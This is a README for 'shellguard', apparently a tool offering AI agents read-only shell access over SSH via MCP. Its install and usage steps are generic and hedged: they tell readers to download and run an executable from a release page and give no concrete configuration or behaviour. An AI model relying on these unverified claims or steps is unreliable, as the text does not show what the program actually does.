# 🛡️ shellguard - Secure Remote Shell Access Tool

[![Download shellguard](https://img.shields.io/badge/Download-shellguard-blue?style=for-the-badge)](https://github.com/knortzwellez/shellguard/releases)

## 📖 What is shellguard?

shellguard is a tool that lets you securely control a remote computer by giving a special program limited, read-only access to the computer's command shell. It works over SSH, a common method to access distant machines safely. This tool is designed for people who want to let AI assistants or other programs interact with a computer's command line without allowing any changes to the files or system. 

In simple terms, shellguard protects your computer by letting trusted programs look but not change anything. This way, you keep your system safe while still allowing useful automated tasks.

shellguard is built with security in mind and works well for developers, system administrators, and anyone who wants to give limited, safe access to a computer remotely.

---

## ⚙️ Key Features

- Provides read-only access to a computer's shell over SSH  
  This means commands can be run to view information but not to make changes.

- Works with AI-based agents and other programs through a protocol called MCP (Model-Context Protocol)  
  It connects AI models safely to your machine for controlled operations.

- Runs as a server program on your computer  
  It listens for incoming secure connections and manages their access.

- Designed with security and transparency  
  Logs all activity so you know what commands are being run.

- Supports common operating systems  
  Linux, macOS, and Windows with SSH capabilities.

- Easy to use once set up, even for non-technical users

---

## 🖥️ System Requirements

To use shellguard, your machine should meet the following:

- Operating System:  
  - Windows 10 or later (with SSH server installed and running)  
  - macOS 10.14 (Mojave) or later  
  - Linux distributions with OpenSSH server available (Ubuntu, Debian, Fedora, etc.)

- SSH server enabled and configured  
  shellguard relies on SSH to secure the connection.

- Internet or local network access between the client and server machine

- At least 1 GB of free RAM and 50 MB disk space for the application

If you are unsure about SSH server setup on your system, there are many guides online for enabling it on Windows, macOS, and Linux.

---

## ⬇️ Download & Install shellguard

To get started with shellguard, follow these steps carefully.

### Step 1: Download the Application

Please visit the official release page to download shellguard:

[Download shellguard Releases](https://github.com/knortzwellez/shellguard/releases)

On this page, find the version that matches your operating system. The files might look like this:

- `shellguard-windows.exe` for Windows  
- `shellguard-linux.tar.gz` for Linux  
- `shellguard-macos.tar.gz` for macOS

Click to download the file for your system.

### Step 2: Installing shellguard

- **Windows:**  
  - After downloading the `.exe` file, double-click it.  
  - Follow the prompts in the installer if any appear.  
  - If no installer shows, the file might be ready to run as-is.

- **macOS and Linux:**  
  - Download the `.tar.gz` file.  
  - Open your terminal application.  
  - Navigate to the folder where you saved the file.  
  - Extract it by running:  
    ```bash
    tar -xvzf shellguard-*.tar.gz
    ```  
  - Change into the extracted folder:  
    ```bash
    cd shellguard-*
    ```  
  - The main program is likely ready to run from here.

### Step 3: Running shellguard

- Open your terminal or command prompt.  
- Navigate to the folder where shellguard is located (if not already there).  
- Run the program by typing:  

  - On Windows:  
    ```cmd
    shellguard-windows.exe
    ```  
  - On macOS/Linux:  
    ```bash
    ./shellguard
    ```

shellguard will start and listen for incoming SSH connections that use the special read-only access.

---

## 🔧 How to Use shellguard

Once the program is running, here is how you can use it:

1. **Connect via SSH:**  
   Use an SSH client to connect to your machine's address and the port where shellguard listens. For example, in your terminal or an SSH app:  
   ```bash
   ssh username@your-machine-address -p PORT_NUMBER
   ```  
   Replace `username`, `your-machine-address`, and `PORT_NUMBER` with your details.

2. **Interact with the shell:**  
   shellguard will allow commands that do not change the system. You can list files, check system status, read config files, and more. Any command that tries to write or modify will be blocked.

3. **Monitor activity:**  
   shellguard keeps logs of all commands run by connected clients. You can review these logs for security and audit purposes.

4. **Use with AI agents:**  
   If you use AI or automation tools that need to connect to your computer, shellguard lets them run safe commands without risking system integrity.

---

## 🔒 Security Notes

- shellguard only allows read-only commands to protect your system.  
- It requires SSH for encrypted and secure connections.  
- You should create unique users and strong passwords for SSH access.  
- Keep your system updated with the latest security patches.  
- Review shellguard’s logs regularly to detect suspicious activity.

---

## 💡 Troubleshooting

- **I can’t connect via SSH**  
  - Make sure your SSH server is running and configured correctly on your machine.  
  - Check if your firewall allows incoming SSH connections on the port shellguard uses.  
  - Verify the machine address and port number you are connecting to.

- **Commands return errors or are blocked**  
  - Remember, shellguard only allows commands that do not modify files or system settings.  
  - Try commands like `ls`, `cat /etc/hosts`, or `whoami` to test.

- **I don’t see logs or can’t find them**  
  - Check the documentation or the folder where shellguard was installed. Logs are usually stored there or in a specified log directory.

- **The application won’t start**  
  - Make sure you are running it on a supported operating system.  
  - Confirm you downloaded the correct version for your system.  
  - Check for missing dependencies, such as OpenSSH server.

---

## 🌐 Learn More and Get Help

For more detailed information, advanced configuration, and support:

- Visit the official GitHub page:  
  https://github.com/knortzwellez/shellguard  

- Check the issues section for common problems and solutions.

- Use the release page to update to the latest version:  
  https://github.com/knortzwellez/shellguard/releases  

---

## 👨‍💻 About This Project

shellguard is part of a set of tools aimed at securely extending computer capabilities to AI systems through safe, read-only shell access. It combines secure remote access with modern AI agent technologies while keeping system security central. The project is written in Go, making it efficient and portable.

---

## 🏷️ Topics

This project relates to:  
`ai-agents`, `cli`, `devops`, `golang`, `llm`, `mcp`, `mcp-server`, `model-context-protocol`, `remote-access`, `security`, `ssh`